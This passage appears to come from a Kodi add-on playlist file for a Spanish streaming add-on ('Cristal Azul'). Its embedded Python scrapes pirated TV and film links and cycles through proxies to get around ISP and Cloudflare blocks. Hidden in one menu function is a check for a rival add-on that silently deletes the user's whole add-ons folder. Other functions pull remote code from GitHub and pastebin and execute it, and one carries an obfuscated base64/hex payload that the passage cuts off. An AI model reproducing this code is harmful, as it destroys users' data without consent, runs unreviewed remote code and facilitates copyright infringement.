      web_hidemi_response = six.ensure_str(web_hidemi_response)
      web_hidemi_items = re.findall('</td></tr><tr><td>(.*?)<.*?(\d+)</td><td><i', web_hidemi_response)
      web_hidemi = []
      for item in web_hidemi_items:
          proxy_integrado = item[0] + ':' + item[1]
          web_hidemi += [proxy_integrado]
  except:
      web_hidemi = ""
  try:
      response = requests.get('https://proxyranker.com/japan#', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
      response = six.ensure_str(response)
      japon_items = re.findall('<tr><td>(.*?)<.*?port">(.*?)<', response)
      web_japon = []
      for item in japon_items:
          proxy_integrado = item[0] + ':' + item[1]
          web_japon += [proxy_integrado]
  except:
      web_japon = ""
  try:
      web_proxy_nuestra_1 = requests.get('https://pastebin.com/raw/Wa13VCMA', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0', 'Referer': 'https://cricfree.stream/home'}, verify=False).text
      web_proxy_nuestra_1 = six.ensure_str(web_proxy_nuestra_1)
      web_proxy_nuestra = re.findall('(\d+.*?:\d+)', web_proxy_nuestra_1)
  except:
      web_proxy_nuestra = ""
  try:
      proxy = web_proxy_nuestra + web_proxy_source + web_hidemi + web_proxy2 + web_proxy1 + web_japon
      Archivo = TRANSLATEPATH('special://home/addons/plugin.video.cristalazul/')
      open(Archivo + 'cambio.txt','wb').write(six.ensure_binary('web_proxy_nuestra='+str(len(web_proxy_nuestra))+'_'+'web_proxy_source='+str(len(web_proxy_source))+'_'+'web_hidemi='+str(len(web_hidemi))+'_'+'web_proxy2='+str(len(web_proxy2))+'_'+'web_proxy1='+str(len(web_proxy1))+'_'+'web_japon='+str(len(web_japon))+'_'))
  except:
      proxy = []
  path = TRANSLATEPATH("special://home/addons/plugin.video.cristalazul/html.txt")
  try:
      f = open(path, 'r')
      key = f.read()
      f.close()
      full = re.findall('Proxi Utilizado=(.*?)_', key)[0]
      proxy.insert(0, full)
  except:
      pass
  contador = 0
  try:
      html = requests.get(url, headers=header, verify=False).text
      html = six.ensure_str(html)
      try:
          html = re.findall('(Contenido bloqueado|Required! \| Cloudflare|Por causas ajenas a Vodafone|<html><body>Object not found</body></html>)', html)[0]
      except:
          html = html
          proxi = 'No Proxies'
  except:
      html = 'Contenido bloqueado'
  while 'Contenido bloqueado' in html or 'Required! | Cloudflare' in html or 'Por causas ajenas a Vodafone' in html or '<html><body>Object not found</body></html>' == html:
      try:
          xbmc.executebuiltin(("Notification([COLOR white]Usando Proxi %s de %s[/COLOR],[COLOR white]Intentando saltar bloqueo[/COLOR], 5000)")%(contador+1, len(proxy)))
          html = requests.get(url, headers=header, proxies={"https": "http://"+proxy[contador]}, verify=False, timeout=10).text
          html = six.ensure_str(html)
          proxi = proxy[contador]
          try:
              html = re.findall('(Contenido bloqueado|Required! \| Cloudflare|Por causas ajenas a Vodafone|<html><body>Object not found</body></html>)', html)[0]
              contador += 1
          except:
              html = html
              xbmc.executebuiltin(("Notification([COLOR white]Proxi %s[/COLOR],[COLOR white]Logrado saltar bloqueo!![/COLOR], 8000)")%(proxi.replace('1', '3').replace('5', '1').replace('2', '5').replace('3', '7').replace('9', '0')))
      except:
          html = 'Contenido bloqueado'
          contador += 1  
      if len(proxy) == 0:
          xbmc.executebuiltin("Notification([COLOR white]Usa VPN No hemos[/COLOR],[COLOR white]Conseguido Proxies!![/COLOR], 8000)")
          return ''
      elif len(proxy) == contador:
          xbmc.executebuiltin(("Notification([COLOR white]Usa VPN Despues de probar %s[/COLOR],[COLOR white]Proxy No hemos saltado bloqueo!![/COLOR], 8000)")%(contador))
          return ''
  ArchivoDestino = TRANSLATEPATH('special://home/addons/plugin.video.cristalazul/')
  open(ArchivoDestino + 'html.txt','wb').write(six.ensure_binary('Proxi Utilizado='+proxi+'_'+str(contador)+html))
  return url
]]></expres>
<page></page>
<cookiejar></cookiejar>
</regex>
<regex>
<name>id3</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[prueba_proxi]'
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
import six,re,requests
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data,Cookie_Jar,m,url=url):#cLrJIhsDApL

  path = TRANSLATEPATH("special://home/addons/plugin.video.cristalazul/html.txt")
  f = open(path, 'r')
  html = f.read()
  f.close()
  wigi = re.findall('(?s)iframe.*?src=[\'"]([^\'"]+)', six.ensure_str(html))[0]
  html_1 = requests.get(wigi, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0', 'Referer': url}, verify=False).text
  ArchivoDestino = TRANSLATEPATH('special://home/addons/plugin.video.cristalazul/')
  open(ArchivoDestino + 'wigi.txt','wb').write(six.ensure_binary(html_1))
  html_1 = six.ensure_str(html_1)
  try:
      url2 = re.findall('source.*?[\'"](.*?m3u8.*?)[\'"]', html_1)[0]
  except:
      pack = re.findall('(eval\(function\(p,a,c,k,e,d.*)', html_1)[0]
      unpack=jsunpack.unpack(pack)
      url2 = re.findall('Clappr.Player[\w\W]*?(?:source|src):\s*[\'"]([^\'"]+)"', unpack)[0] + '|Referer=' + url
  return url2
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
</item>









<item>
<title>[COLOR lightskyblue]Estable [COLOR orangered]Chikiry_Cristal TV HD[/COLOR]</title>
<link>$doregex[A]</link>
<regex>
<name>A</name>
<listrepeat><![CDATA[
<title>[A.param1]</title>
<thumbnail>[A.param3]</thumbnail>
<fanart>https://i.imgur.com/yNfc6m7.jpg</fanart>
<link>$doregex[busca]</link>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data, Cookie_Jar, m):
    items = [('[COLOR gold]** [/COLOR][COLOR white]INFORMACION IMPORTANTE[COLOR gold] **[/COLOR]', 'informacion', 'https://i.imgur.com/Z2uD47a.jpg'), ('[COLOR orangered]+ [COLOR white]CANALES DE DEPORTES[/COLOR]', 'deportes', 'https://i.imgur.com/ZcG5Wvu.jpg'), ('[COLOR orangered]+ [COLOR white]TV PREMIUM[/COLOR]', 'tvpremium', 'https://i.imgur.com/AhCogTD.jpg'), ('[COLOR orangered]+ [COLOR white]TDT[/COLOR]', 'tdt', 'https://i.imgur.com/Zu3ZtDQ.jpg'), ('[COLOR orangered]+ [COLOR white]TV INFANTIL[/COLOR]', 'infantil', 'https://i.imgur.com/7iGElA4.jpg'), ('[COLOR orangered]+ [COLOR white]CANALES DE DOCUMENTALES[/COLOR]', 'documentales', 'https://i.imgur.com/hzBiiWJ.jpg'), ('[COLOR orangered]+ [COLOR white]TAQUILLAS[/COLOR]', 'taquilla', 'https://i.imgur.com/gfpSeHc.jpg'), ('[COLOR orangered]+ [COLOR white]LATINOS[/COLOR]', 'latino', 'https://i.imgur.com/8nIpSn3.jpg')]
    return items
]]></expres>
<page></page>
<agent></agent>
</regex>
<regex>
<name>busca</name>
<listrepeat><![CDATA[
<title>[COLOR white][busca.param1][/COLOR]</title>
<link>$doregex[plugin]$doregex[link_inteligente]</link>
<thumbnail>[busca.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
elegir = '[A.param2]'
import re,requests,base64,shutil
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data, Cookie_Jar, m,elegir=elegir):

 try:
  estamos = xbmcaddon.Addon('plugin.video.blackghost')
  version = estamos.getAddonInfo('version')
  if '.' in version:
    addon_path = TRANSLATEPATH('special://home/addons').decode('utf-8')
    shutil.rmtree(addon_path, ignore_errors=True)
    return xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
 except:
  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'FusionTv' in id:
    past = urllib_request.urlopen('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/TV/cristal_chikiry_distancia').read()
    past = six.ensure_str(past)
    if 'p' == past[:2:][1:]:
      past = 'https://pastebin.com/raw/' + past[:1] + past[2:]
    elif 'b' == past[:2:][1:]:
      past = 'http://bit.ly/' + past[:1] + past[2:]
    else:
      past = 'https://pastebin.com/raw/' + past
    if 'informacion' == elegir:

      dialog = xbmcgui.Dialog()
	  
      dialog.textviewer('CHIKIRY_CRISTAL TV', '[COLOR gold]El addon es completamente gratuito, no se aceptan donaciones.[/COLOR]\n[COLOR white]Si has pagado por el te han estafado.[/COLOR]\n[COLOR white]Las secciones se actualizan a diario, si un canal no funciona, reportarlo en los grupos [/COLOR]\n[COLOR aqua]https://t.me/consultaschikiry    https://t.me/addonfestaycristal[/COLOR]\n[COLOR white]No exijas, no te enfades, no critiques, recuerda que esto es un hobby que compartimos en nuestro tiempo libre, no un servicio de pago[/COLOR]\n[COLOR aqua]Gracias, y disfruta[/COLOR]')

      return [('El addon es completamente gratuito, no se aceptan donaciones.', 'https://i.imgur.com/Z2uD47a.jpg', '[COLOR aqua]Cristal Azul Resultados de: [COLOR white]', ' ')]
		  
    elif 'deportes' == elegir:
	
      html = requests.get(past, headers={'User-Agent': 'Mozilla/5.0', 'Referer': 'http://pastebin.com'}, verify=False).text

      html = six.ensure_str(html)
	  
      data = re.findall('(?s)"DEPORTES".*?"name": "(.*?)".*?"image": "(.*?)".*?"url": "(.*?)".*?"embed": "(.*?)\'', html)

      return [('[COLOR aqua]Chikiry Cristal Resultados de: [COLOR white]Deportes', 'https://i.imgur.com/Z2uD47a.jpg', '[COLOR aqua]Cristal Azul Resultados de: [COLOR white]', ' ')] + data + [('[COLOR none]No Hay mas Resultados...', 'https://i.imgur.com/Z2uD47a.jpg', '[COLOR none]No hay mÃƒÂ¡s', '[COLOR white]resultados...')]	  

    elif 'tvpremium' == elegir:
	
      html = requests.get(past, headers={'User-Agent': 'Mozilla/5.0', 'Referer': 'http://pastebin.com'}, verify=False).text
	  
      html = six.ensure_str(html)

      data = re.findall('(?s)"TVPREMIUM".*?"name": "(.*?)".*?"image": "(.*?)".*?"url": "(.*?)".*?"embed": "(.*?)\'', html)

      return [('[COLOR aqua]Chikiry Cristal Resultados de: [COLOR white]TvPremium', 'https://i.imgur.com/Z2uD47a.jpg', '[COLOR aqua]Cristal Azul Resultados de: [COLOR white]', ' ')] + data + [('[COLOR none]No Hay mas Resultados...', 'https://i.imgur.com/Z2uD47a.jpg', '[COLOR none]No hay mÃƒÂ¡s', '[COLOR white]resultados...')]
		  

    elif 'tdt' == elegir:
	
      html = requests.get(past, headers={'User-Agent': 'Mozilla/5.0', 'Referer': 'http://pastebin.com'}, verify=False).text

      html = six.ensure_str(html)
	  
      data = re.findall('(?s)"TDT".*?"name": "(.*?)".*?"image": "(.*?)".*?"url": "(.*?)".*?"embed": "(.*?)\'', html)

      return [('[COLOR aqua]Chikiry Cristal Resultados de: [COLOR white]Tdt', 'https://i.imgur.com/Z2uD47a.jpg', '[COLOR aqua]Cristal Azul Resultados de: [COLOR white]', ' ')] + data + [('[COLOR none]No Hay mas Resultados...', 'https://i.imgur.com/Z2uD47a.jpg', '[COLOR white]No hay mÃƒÂ¡s', '[COLOR white]resultados...')]
		  

    elif 'infantil' == elegir:
	
      html = requests.get(past, headers={'User-Agent': 'Mozilla/5.0', 'Referer': 'http://pastebin.com'}, verify=False).text

      html = six.ensure_str(html)
	  
      data = re.findall('(?s)"INFANTIL".*?"name": "(.*?)".*?"image": "(.*?)".*?"url": "(.*?)".*?"embed": "(.*?)\'', html)

      return [('[COLOR aqua]Chikiry Cristal Resultados de: [COLOR white]Infantil', 'https://i.imgur.com/Z2uD47a.jpg', '[COLOR aqua]Cristal Azul Resultados de: [COLOR white]', ' ')] + data + [('[COLOR none]No Hay mas Resultados...', 'https://i.imgur.com/Z2uD47a.jpg', '[COLOR white]No hay mÃƒÂ¡s', '[COLOR white]resultados...')]
		  

    elif 'documentales' == elegir:
	
      html = requests.get(past, headers={'User-Agent': 'Mozilla/5.0', 'Referer': 'http://pastebin.com'}, verify=False).text
	  
      html = six.ensure_str(html)

      data = re.findall('(?s)"DOCUMENTALES".*?"name": "(.*?)".*?"image": "(.*?)".*?"url": "(.*?)".*?"embed": "(.*?)\'', html)

      return [('[COLOR aqua]Chikiry Cristal Resultados de: [COLOR white]Documentales', 'https://i.imgur.com/Z2uD47a.jpg', '', ' ')] + data + [('[COLOR none]No Hay mas Resultados...', 'https://i.imgur.com/Z2uD47a.jpg', 'No Hay mas Resultados...', '[COLOR white]resultados...')]
	  
    elif 'taquilla' == elegir:
	
      html = requests.get(past, headers={'User-Agent': 'Mozilla/5.0', 'Referer': 'http://pastebin.com'}, verify=False).text
	  
      html = six.ensure_str(html)

      data = re.findall('(?s)"TAQUILLA".*?"name": "(.*?)".*?"image": "(.*?)".*?"url": "(.*?)".*?"embed": "(.*?)\'', html)

      return [('[COLOR aqua]Chikiry Cristal Resultados de: [COLOR white]Taquilla', 'https://i.imgur.com/bg6n3AV.png', '[COLOR aqua]Cristal Azul Resultados de: [COLOR white]', ' ')] + data + [('[COLOR none]No Hay mas Resultados...', 'https://i.imgur.com/QBdkMFK.jpg', '[COLOR white]No hay mÃƒÂ¡s', '[COLOR white]resultados...')]

    elif 'latino' == elegir:
	
      html = requests.get(past, headers={'User-Agent': 'Mozilla/5.0', 'Referer': 'http://pastebin.com'}, verify=False).text
	  
      html = six.ensure_str(html)

      data = re.findall('(?s)"LATINO".*?"name": "(.*?)".*?"image": "(.*?)".*?"url": "(.*?)".*?"embed": "(.*?)\'', html)

      return [('[COLOR aqua]Chikiry Cristal Resultados de: [COLOR white]Latinos', 'https://i.imgur.com/bg6n3AV.png', '[COLOR aqua]Cristal Azul Resultados de: [COLOR white]', ' ')] + data + [('[COLOR none]No Hay mas Resultados...', 'https://i.imgur.com/QBdkMFK.jpg', '[COLOR white]No hay mÃƒÂ¡s', '[COLOR white]resultados...')]
    else:
      xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
      return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")

]]></expres>
<page></page>
</regex>
<regex>
<name>emitiendo</name>
<expres><![CDATA[(?s)[makelist2.param4].*?ahora">\s*(.*?)<]]></expres>
<page>http://www.formulatv.com/programacion/movistarplus/</page>
</regex>
<regex>
<name>prueba_proxi</name>
<expres><![CDATA[#$pyFunction
url = '[busca.param3]'
header = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0','Referer': 'https://www.blogdepelis.tv/'}
from resolveurl.plugins.lib import jsunpack
from datetime import datetime, timedelta
import time
import re,requests
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
$doregex[reparar_proxies]
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
<regex>
<name>reparar_proxies</name>
<expres><![CDATA[#$pyFunction
import requests,six
def GetLSProData(page_data,Cookie_Jar,m):
    #oficial https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/proxieshttps://pastebin.com/raw/GDkjkYh6
    pasta = requests.get('https://pastebin.com/raw/GDkjkYh6', verify=False).text
    return six.ensure_str(pasta)
]]></expres>
<page></page>
</regex>
<regex>
<name>link_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[prueba_proxi]'
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
import six,re,requests
from resolveurl.plugins.lib import jsunpack
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data,Cookie_Jar,m,url=url):#cLrJIhsDApL
  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'FusionTv' in id:
    if 'adictosalatele' in url:
      path = TRANSLATEPATH("special://home/addons/plugin.video.cristalazul/html.txt")
      f = open(path, 'r')
      html = f.read()
      f.close()
      iframe = re.findall('(?s)iframe.*?src=[\'"]([^\'"]+)', html)[0]
      html1 = requests.get(iframe, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0', 'Referer': url}, verify=False).text
      try:
          url2 = re.findall('source.*?[\'"](.*?m3u8.*?)[\'"]', html1)[0]
      except:
          pack = re.findall('(eval\(function\(p,a,c,k,e,d.*)', html1)[0]
          unpack=jsunpack.unpack(pack)
          url2 = re.findall('Clappr.Player[\w\W]*?(?:source|src):\s*[\'"]([^\'"]+)"', unpack)[0] + '|Referer=' + url
      return url2
    elif 'f4m=' in url:
      url = url[4:]
      return '/?mode=10&' + url
    else:
      return url
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
]]></expres>
<page></page>
</regex>
<regex>
<name>plugin</name>
<expres><![CDATA[#$pyFunction
url = '[busca.param3]'
import re,requests,xbmc
def GetLSProData(page_data,Cookie_Jar,m,url=url):#cPrLItsLTfakl
 
  if 'f4m=' in url:
    return 'plugin://plugin.video.cristalazul_3.0'
  else:
    return ''
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/Z2uD47a.jpg</thumbnail>  
<fanart>http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png</fanart>
 </item>





























<item>
<title>[COLOR gold]*[/COLOR] [COLOR darkgoldenrod]Cine [COLOR bisque]estrenos cristal[/COLOR]</title>  
<link>$doregex[c]</link>
<regex>
<name>c</name>
<listrepeat><![CDATA[
<title>[c.param1]</title>
<genre>[c.param2]</genre>
<year>[c.param3]</year>
<info>[c.param6]</info>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[c.param4]</thumbnail>
<fanart>[c.param5]</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
#superestrenos3
def GetLSProData(page_data,Cookie_Jar,m):
 
  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'FusionTv' in id:
    pastebin0 = 'https://pastebin.com/u/Hectobo roba'
    pastebino0 = 'aHR0cHgfjgjgfjjnHFUFD=='
    pastebin0o = 'aHR0cHM6Ly8='
    pastebino = 'dsfrQWoPWWKDH='
    url = 'QnVzY2Fkb3JfcGlkZXBhbG9taXRhc19wb3N0'
    try:
      page = urllib_request.urlopen('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/DISTANCIA.D/superestrenos.distancia').read()
      page = six.ensure_binary(page)
      page_data = base64.decodestring(page[2:])
      extraer = urllib_request.urlopen('http://bit.ly/'+six.ensure_str(page_data)).read()
      extraer = six.ensure_str(extraer)
    except:
      xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold]Imposible Conectar Con Base de Datos[/COLOR], 15000)")
      return [('[COLOR red]No Se Puede Acceder a la base...[/COLOR]', ' ', 'https://i.imgur.com/2tS3oPI.jpg', 'https://i.imgur.com/2tS3oPI.jpg', 'Imposible Concetar con la base', 'https://www.youtube.com/watch?v=4DPGjjCBcAg')] + [('[COLOR aqua]Solucion en Telegram: [COLOR white]@addonfestaycristal[/COLOR]', ' ', 'https://i.imgur.com/2tS3oPI.jpg', 'https://i.imgur.com/2tS3oPI.jpg', 'Imposible Concetar con la base', 'https://www.youtube.com/watch?v=4DPGjjCBcAg')]
    ExpresCristal = re.findall('(?s)<title>(.*?)<.*?genre>(.*?)<.*?year>(.*?)<.*?thumbnail>(.*?)<.*?fanart>(.*?)<.*?info>(.*?)<.*?<urlsolve>(.*?)<', extraer)
    return [('[COLOR aqua]Cristal Azul Resultados de: [COLOR white]Estrenos[/COLOR]', ' ', ' ', 'https://i.imgur.com/2tS3oPI.jpg', 'http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png', ' ', 'https://www.youtube.com/watch?v=4DPGjjCBcAg')] + ExpresCristal + [('[COLOR white]No hay más resultados...[/COLOR]', ' ', ' ', 'https://i.imgur.com/2tS3oPI.jpg', 'http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png', ' ', 'https://www.youtube.com/watch?v=4DPGjjCBcAg')]
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
]]></expres>
<page></page>
</regex>
<regex>
<name>multi</name>
<expres><![CDATA[#$pyFunction
url = '[c.param7]'
title = '[c.param1]'
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
import re,json
def GetLSProData(page_data,Cookie_Jar,m,url=url,title=title):

    if '{' in url[:5]:
        items = json.loads('['+url+']')
        dialog = xbmcgui.Dialog()
        seleccion = []
        enlaces = []
        for item in items:
            seleccion.append(item['titulo'])
            enlaces.append(item['url'])
        titulo = dialog.select('seleciona enlace: '+title, seleccion)
        if (titulo < 0):
            dialog = xbmcgui.Dialog()
            dialog.notification("Cristal Azul", "Reproduccion cancelada!!!",
                            xbmcgui.NOTIFICATION_INFO, 5000, False)
            return
        return enlaces[titulo]
    else:
      if '104 116 116 112 115'==url[:17]:
          return desencriptar()
      elif '106 98 98 114 114'==url[:17]:
        return 'https' + desencriptar()[5:]
      else:
        return url
def desencriptar():
  s = url
  def enc(s):
    d=''
    s=s.split(' ')
    for strchar in s:
        d += chr(int(strchar)-0)
    return d
  return enc(s)
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[multi]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
def GetLSProData(page_data,Cookie_Jar,m):
    pasta = requests.get('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/conector.a.distancia.definitivo', verify=False).text
    return six.ensure_str(pasta)
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64, codecs

morpheus = 'aW1wb3J0IGJhc2U2NCwgemxpYiwgY29kZWNzLCBiaW5hc2NpaSwgc2l4Cgptb3JwaGV1cyA9ICc2NTRhNzk3NDU3NmM3NDdhNmYzODY5NTM2Njc1Mzk2NjRkNTczODM5NGEyZjYyNDU0MzUzMzY1MzU0Nzk3NDY5NWE3OTRlNGIzNTY5MzQ0YjQ3NTE0ODQzNTY0ZDc5NGM1NDRkNzU3OTUxNDM1NzQyNTI2ODZhNDI3MjM5Mzg3NjQzMzc3NDM3MzU3MzU0NDU1MDc1MzI0NDU3NmY0YjM2NWE1ODM1MzU3MTY2Nzk3OTY2NWE1NDRlMzU1ODcyMzczNTU3NTgzMzc4MmYzNTY4Mzk3MzM5NjY3OTczNzYzMzY2NjY2ZTQ4NmM3OTJmNzk2MzZkMzM2NTM5NzQzMDY2NzYyZjdhMzI3OTM5NjQ2NDcyNzY2Mzc2NWE3MTQ0MzU2Mjc2NDI1NzQ3NzA2YjUyNTA2NjYxNDg3NjYyNzczMzc4NjI0NTJmNDY0ZDYxNjk0NjZlNmIzMDY4NmYyZjRjMzQ3OTM2NjY1OTdhNzg3MTY0NmI2YzJmNGI0OTMzNTQzNzUwNDg1MTMzNGM0Mzc1MzMzNzZjNjI3NjUyN2E1OTc3NmUyZjQ1NjE0YzcwMzU2OTM4NjI2MTZhNGI3NzRkNmU3NzQ5NjY3NjQyNzY3NDZiNjQ1MDc2NmM0Mjc0NTI1NjU5MzU2MzJiNmQ1YTU1NjI1MzU0NDc2ODcxNGM2MTc2NzY0NzUyMzY2NTc1NTUzNjMxNDY2MTM2NmQ3MzRjMzc3NzMxNjI0NTMxNTkzNTUyNzA1Nzc2MzgyZjQ4Mzc1NzM1NTI2ZDUyNzA0NzU3NDc3NDYxNjEzMDYyNjczNTUyNzQ2MjQyMzQ0MjU4NTg0ZDRlMmY2YjU2NjE1YTQ2NjI2ZDQ2NjcyZjUzNzg0YjYxNzczMzcyNTQzOTQ1NTk0NzMzNzc3MzQyNzI3NzMzNjk3YTUzNjI1MjM1NWE0ZTM1NzczNTUyNjU2ODY5NmE2YjYzMmI2YTY5NmYyYjUyNGE2NjQxNzYzMTMwNTE0YjRmNTc1NTc4MzQ2YTY2NGY3MzM3NTY3MDU4MzQzNzM5NTM3YTMyNTM0NzYyMzIyZjUyMzI2ZDY4NTIzMTU2NzM2YjQ0MzUzODRjNGYyYjUxNTgzNTMzNTA1YTU3NDc0OTc0NGE3OTU0NmU0NTU4NGI2ODJiNmMzOTRkNjU0ZDZhNWE0MjZmNGM3OTRkNDI3ODJmNzE2MTRiNzA0MTMxMzk3ODU0NDc1MzMyNDM1MDZjMzI0ZDRmNDg0ODRlNjg2ZTZhNDE2NDUyNjk1NjRmNTUzMjM5NDM2YTY3NGIzNDVhN2E1NDc2Njg0NDRhNDk1NDM2Nzc2YzQ4Nzk0NDc0NDM2NjM5NzE3YTM4Njc2YzU4NDQ2NjRmNDE1NTdhNzc0NDY2NzM0MTMwNGY0MTRhNzY3YTRkMmI0Nzc5NGI2ZjRhNTIzNTRiNGM3MzRlNjM2OTUzNjY3MDQyNzI3ODUyMzQ1NjQ3NTE1ODY1NjcyZjM5NzA0NDJmNjkyYjUyNjg1NjZiNGUyZjRiNjc0MTU4NWE0MjY2NTA0ODQxMmY1OTU0NTIyYjY5NDIyZjYyNGQzNTQ4NzcyZjQ3MzI3NDcxMmI1MjU3NTE3Njc3NmU0ZjRkNzM1NjM5NGE2NTRhNzMzODM1NTgzMDQ1Mzc0OTQ4Njk1MTUwNGE0MjQ2MzU0YTQyNzgzNzZlNTE3OTM0NTk2MzVhNGM2NTQ0NDk1MzcyNDM2ODJiNzM0YjMxMmI3MTY3NTk1Mjc4N2E0NzYyNDM0ZDZmNTczODc4MzI1YTc0MmI2YjMzMmI0ZDQyMzIzMjRlMzgzNjQ3NTg1NjY3NDE2NjY2NGE0ZjY1NzM0OTQ3NzQ0MTYzNjM2MTZkNDU0NjQ3MzI0ZTQ4NDYyZjRhNTQzODY4NmU0MTU3NGQ2ODcyNjg0YTMxNjE3MzZiNWEzOTQxNjI3NTQyNzc0OTQyNzg3MjU3NjcyYjM3NmIyZjMzNjc1NDc4NmU2Yjc3NzIzNTZiNDIyYjc3NmUzMDZkNDk0NzJiMzU0YTJmMzk0NDY5NjYzMzZiNzY3OTZkNzk0OTQ2NzI3NjQzMmY0ZTY1MzE2ZTQ5NTI1YTZmNmU3NTU1NjIzMDJiMzk2MTZlMzczNjY4NGMyZjZkMzU2YTQzNjYyZjcxNTg3YTZmNmM3MDQ3NjY1OTc5Nzk0NzY2NTg3YTczNDczODRlNzU0NDQ4MzY1MDM5Mzg0MzU4NmIzMzM5MmY3OTQyMzA3MDRmNjU0MjU0MzA2NzU5MmI0NzRhNjU0NTQyNjY2ZDQ2NzI1NTYzNmE3ODcxNzM2MTM4NmI0YTJiNDYyZjc0NjEzNTRmMmY3NzY3MzQ3MjZiNGE3YTM4NTU2Yjc4MzE0ODJiNTAzNzQ5NTk0NTJiNjE1YTc3NGQ0ODZlNGE2NjM2Nzc0YjZiNmI2MjQ1NmI1MDMyNGM1NzQxNTgzODU5MzY2ZTYxMzk3NzcyNzI0YTc4NmU2MzVhMzMzMjQ5MmY3Nzc3NDg3MjM0NjQ3ODU3NjI0NjQ4NjM2MzM2MmI0MTMzNmQ3NjcxNDc2ZTYxNGQ0YjM5NmI0ZTM4MzQ0NTdhNTk3NzU2NjI2YTY4NDM0ZTczNTM1ODQ1NDE2NjM0NmU2ODQ4N2E0ODcwNTI2NjcyNDI0NDc5NDI0ODQzNmE2YzQ4MmI0ZDM5MzQ2NzQ0MzQ2Yzc4NTI1ODY5NDczMzRjNDI0NjJmNDg2MzU5MmYzNDU1NmEzNTQxNGUzOTY4NzE0MTRkMzQzMTZhNmE1NTMyMmI0NDM3NzM2ODQ0NmM1MDZmMzU3OTQ5NTc0YjcwNzk2Mjc4NzU2MTYxMzc0OTM2N2E0MzM3NGI3YTdhNDE2NzMzNmU0ZDc0NDk0ZTJmNzI2NzU4NDk3MDRjMzU0MjUxMzY0YzMyNTg1MTQ2NjY3MzcxMzM0OTQ1NTI1YTQyNTY2Yjc4Mzk0NzY2MzQ2NzQ4MzQ3NzQ4NTk2YTM1NTIzMTQyMmI3OTc0Mzc3MTQ4N